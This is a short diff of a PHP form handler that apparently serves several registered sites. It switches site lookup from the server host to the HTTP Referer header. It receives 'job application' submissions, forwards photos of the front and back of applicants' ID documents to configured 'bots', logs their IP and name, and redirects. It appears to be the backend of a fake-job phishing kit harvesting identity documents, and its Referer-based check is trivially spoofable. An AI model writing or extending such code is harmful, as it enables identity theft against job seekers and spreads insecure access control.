@@ -25,13 +25,16 @@ $site_map = [
     // Add more sites...
 ];
 
-// 🔍 Determine domain
-$host = $_SERVER['HTTP_HOST'] ?? 'unknown';
-$config = $site_map[$host] ?? null;
+
+// 🧠 Determine origin domain (not PHP host)
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+$config = $site_map[$domain] ?? null;
 
 if (!$config) {
     http_response_code(403);
-    exit("Access denied: Unregistered site.");
+    exit("Access denied: Unauthorized site ($domain).");
 }
 
 // 🚀 Handle POST
@@ -149,7 +152,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
     sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
 
-    log_entry("✅ [$host] Job application received from $ip ($full_name)");
+    log_entry("✅ [$domain] Job application received from $ip ($full_name)");
 
     header("Location: " . $config['redirect']);
     exit;
